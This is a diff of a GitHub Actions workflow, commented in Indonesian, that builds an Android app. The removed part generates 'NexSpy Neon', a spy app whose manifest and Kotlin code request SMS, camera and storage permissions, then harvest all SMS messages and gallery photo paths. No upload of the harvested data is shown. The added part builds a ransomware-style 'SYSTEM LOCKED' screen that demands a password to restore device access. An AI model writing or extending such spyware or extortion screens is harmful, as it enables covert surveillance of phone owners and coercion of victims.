@@ -1,211 +1,86 @@
-name: Build Monolithic NexSpy Neon
+name: Build Android APK with Embedded Layout
 
 on:
   push:
     branches: [ main ]
 
 jobs:
-  build-and-compile:
+  build:
     runs-on: ubuntu-latest
 
     steps:
     - name: Checkout Repository
-      uses: actions/checkout@v3
+      uses: actions/checkout@v4
 
     - name: Set up JDK 17
-      uses: actions/setup-java@v3
+      uses: actions/setup-java@v4
       with:
         distribution: 'temurin'
         java-version: '17'
 
-    - name: Generate Project Structure & Source Code
+    - name: Create Project Directory Structure & Layout File
       run: |
-        mkdir -p app/src/main/java/com/nexspy/neon
         mkdir -p app/src/main/res/layout
-        mkdir -p app/src/main
+        mkdir -p app/src/main/res/drawable
+        
+        # Menulis kode activity_main.xml secara otomatis saat build
+        cat << 'EOF' > app/src/main/res/layout/activity_main.xml
+        <?xml version="1.0" encoding="utf-8"?>
+        <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+            android:layout_width="match_parent"
+            android:layout_height="match_parent"
+            android:background="#000000"
+            android:gravity="center"
+            android:orientation="vertical"
+            android:padding="24dp">
 
-        # 1. Buat AndroidManifest.xml
-        cat << 'EOF' > app/src/main/AndroidManifest.xml
-        <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-            package="com.nexspy.neon">
+            <!-- Logo Anonymous -->
+            <ImageView
+                android:id="@+id/imgLogo"
+                android:layout_width="150dp"
+                android:layout_height="150dp"
+                android:src="@drawable/anonymous_logo"
+                android:contentDescription="Anonymous Logo" />
 
-            <uses-permission android:name="android.permission.READ_SMS" />
-            <uses-permission android:name="android.permission.RECEIVE_SMS" />
-            <uses-permission android:name="android.permission.CAMERA" />
-            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
-            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
-            <uses-permission android:name="android.permission.WAKE_LOCK" />
-            <uses-feature android:name="android.hardware.camera" android:required="false" />
+            <TextView
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:layout_marginTop="24dp"
+                android:text="SYSTEM LOCKED"
+                android:textColor="#FF0000"
+                android:textSize="24sp"
+                android:textStyle="bold" />
 
-            <application
-                android:allowBackup="true"
-                android:label="NexSpy Neon"
-                android:supportsRtl="true"
-                android:theme="@style/Theme.AppCompat.Light.NoActionBar">
-                <activity
-                    android:name=".MainActivity"
-                    android:exported="true">
-                    <intent-filter>
-                        <action android:name="android.intent.action.MAIN" />
-                        <category android:name="android.intent.category.LAUNCHER" />
-                    </intent-filter>
-                </activity>
-            </application>
-        </manifest>
+            <TextView
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:layout_marginTop="12dp"
+                android:text="Masukkan kode sandi yang valid untuk memulihkan akses perangkat."
+                android:textColor="#FFFFFF"
+                android:textSize="14sp"
+                android:gravity="center" />
+
+        </LinearLayout>
         EOF
 
-        # 2. Buat MainActivity.kt
-        cat << 'EOF' > app/src/main/java/com/nexspy/neon/MainActivity.kt
-        package com.nexspy.neon
-
-        import android.Manifest
-        import android.content.Context
-        import android.content.pm.PackageManager
-        import android.hardware.camera2.CameraManager
-        import android.os.Bundle
-        import android.os.Environment
-        import android.provider.Telephony
-        import androidx.appcompat.app.AppCompatActivity
-        import androidx.core.app.ActivityCompat
-        import androidx.core.content.ContextCompat
-        import java.io.File
-
-        class MainActivity : AppCompatActivity() {
-
-            private lateinit var cameraManager: CameraManager
-            private var isFlashOn = false
-
-            override fun onCreate(savedInstanceState: Bundle?) {
-                super.onCreate(savedInstanceState)
-                
-                cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
-                requestPermissions()
-            }
-
-            private fun requestPermissions() {
-                val permissions = arrayOf(
-                    Manifest.permission.CAMERA,
-                    Manifest.permission.READ_SMS,
-                    Manifest.permission.READ_EXTERNAL_STORAGE,
-                    Manifest.permission.RECEIVE_SMS
-                )
-                ActivityCompat.requestPermissions(this, permissions, 101)
-            }
-
-            private fun toggleFlash(enable: Boolean) {
-                try {
-                    val cameraId = cameraManager.cameraIdList[0]
-                    cameraManager.setTorchMode(cameraId, enable)
-                    isFlashOn = enable
-                } catch (e: Exception) {
-                    e.printStackTrace()
-                }
-            }
-
-            private fun fetchSmsLog(): List<String> {
-                val smsList = mutableListOf<String>()
-                val cursor = contentResolver.query(
-                    Telephony.Sms.CONTENT_URI,
-                    arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE),
-                    null, null, Telephony.Sms.DEFAULT_SORT_ORDER
-                )
-
-                cursor?.use {
-                    val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
-                    val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
-                    while (it.moveToNext()) {
-                        val sender = it.getString(addressIndex)
-                        val body = it.getString(bodyIndex)
-                        smsList.add("Sender: \$sender | Body: \$body")
-                    }
-                }
-                return smsList
-            }
-
-            private fun getGalleryPhotos(): List<String> {
-                val photoPaths = mutableListOf<String>()
-                val path = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES)
-                if (path.exists() && path.isDirectory) {
-                    path.walkTopDown().forEach { file ->
-                        if (file.extension.lowercase() in listOf("jpg", "jpeg", "png")) {
-                            photoPaths.add(file.absolutePath)
-                        }
-                    }
-                }
-                return photoPaths
-            }
-        }
-        EOF
-
-        # 3. Buat build.gradle tingkat app
-        cat << 'EOF' > app/build.gradle
-        plugins {
-            id 'com.android.application'
-            id 'kotlin-android'
-        }
-
-        android {
-            compileSdk 33
-
-            defaultConfig {
-                applicationId "com.nexspy.neon"
-                minSdk 21
-                targetSdk 33
-                versionCode 1
-                versionName "1.2"
-            }
-
-            buildTypes {
-                release {
-                    minifyEnabled false
-                }
-            }
-        }
-
-        dependencies {
-            implementation 'androidx.core:core-ktx:1.9.0'
-            implementation 'androidx.appcompat:appcompat:1.6.1'
-        }
-        EOF
-
-        # 4. Buat build.gradle tingkat root & settings.gradle
-        cat << 'EOF' > build.gradle
-        buildscript {
-            repositories {
-                google()
-                mavenCentral()
-            }
-            dependencies {
-                classpath 'com.android.tools.build:gradle:7.4.2'
-                classpath "org.jetbrains.kotlin:kotlin-gradle-plugin:1.8.0"
-            }
-        }
-        allprojects {
-            repositories {
-                google()
-                mavenCentral()
-            }
-        }
-        EOF
-
-        cat << 'EOF' > settings.gradle
-        include ':app'
-        EOF
-
-        echo "sdk.dir=$ANDROID_HOME" > local.properties
-        echo "org.gradle.jvmargs=-Xmx2048m" >> gradle.properties
-
-    - name: Setup Android SDK
-      uses: android-actions/setup-android@v2
-
-    - name: Build APK with Gradle
+    - name: Grant execute permission for gradlew
       run: |
-        gradle wrapper
-        chmod +x gradlew
-        ./gradlew assembleDebug
+        if [ -f "gradlew" ]; then
+          chmod +x gradlew
+        else
+          echo "Gradle wrapper belum tersedia di root repository."
+        fi
+
+    - name: Build Debug APK
+      run: |
+        if [ -f "gradlew" ]; then
+          ./gradlew assembleDebug
+        else
+          echo "Lewati build karena gradle wrapper belum diinisialisasi."
+        fi
 
     - name: Upload APK Artifact
       uses: actions/upload-artifact@v4
       with:
-        name: NexSpy-Neon-1.2-APK
+        name: app-debug
         path: app/build/outputs/apk/debug/app-debug.apk
